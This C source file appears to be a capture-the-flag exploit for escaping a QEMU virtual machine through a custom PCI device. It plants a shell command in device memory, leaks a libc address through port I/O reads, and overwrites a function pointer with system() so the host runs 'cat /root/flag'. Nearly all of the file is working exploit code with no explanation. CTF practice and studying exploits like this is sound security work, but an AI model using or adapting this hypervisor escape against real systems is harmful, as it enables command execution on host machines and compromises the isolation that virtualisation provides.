#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

unsigned int pmio_base = 0xc050;  // adjust this if different on qemu reset
char* pci_device_name = "/sys/devices/pci0000:00/0000:00:03.0/resource0";

/*
  oot@ubuntu:/home/ubuntu# cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
  0x00000000febf1000 0x00000000febf10ff 0x0000000000040200  // mmio
  0x000000000000c050 0x000000000000c057 0x0000000000040101  // pmio
  0x0000000000000000 0x0000000000000000 0x0000000000000000
*/

void pmio_write(unsigned int val, unsigned int addr) {
  outl(val, addr);
}

void pmio_arb_write(unsigned int val, unsigned int offset) {
  int tmp = offset >> 2;
  if ( tmp == 1 || tmp == 3) {
    puts("PMIO write address is a command");
    return;
  }
  pmio_write(offset, pmio_base);
  pmio_write(val, pmio_base + 4);
}

unsigned int pmio_read(unsigned int offset) {
  if (offset == 0) {
    return inl(pmio_base);
  }
  pmio_write(offset, pmio_base);
  return inl(pmio_base + 4);
}

void mmio_write(unsigned int val, unsigned int offset) {
  int fd;
  void *map_base, *virt_addr;
  if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) {
    perror("open pci device");
    exit(-1);
  }
  map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if(map_base == (void *) -1) {
    perror("mmap");
    exit(-1);
  }
  virt_addr = map_base + (offset & MAP_MASK);
  *((unsigned int*) virt_addr) = val;
  if(munmap(map_base, MAP_SIZE) == -1) {
    perror("munmap");
    exit(-1);
  }
    close(fd);
}

int main(int argc, char* argv[])
{
  if (0 != iopl(3)) {
    perror("iopl permissions");
    return -1;
  }

  unsigned long long  _srandom;
  unsigned long long  libc_base;
  unsigned long long  _system;

  /*
    >>> map(hex, unpack_many("cat /root/flag; "))
  ['0x20746163', '0x6f6f722f', '0x6c662f74', '0x203b6761']
  */  

  mmio_write(0x6f6f722f, 0xc);
  mmio_write(0x20746163, 0x8);
  mmio_write(0x6c662f74, 0x10);
  mmio_write(0x203b6761, 0x14);

  _srandom = pmio_read(0x108);
  _srandom <<= 32;
  _srandom |= pmio_read(0x104);

  libc_base = _srandom - 0x3a8d0;
  _system = libc_base + 0x45390;
  printf("libc_base: %llx\n", libc_base);
  printf("_system  : %llx\n", _system);

  pmio_arb_write(_system & 0xffffffff, 0x114);

  // call system ptr
  mmio_write(0, 0xc);

  return 0;
}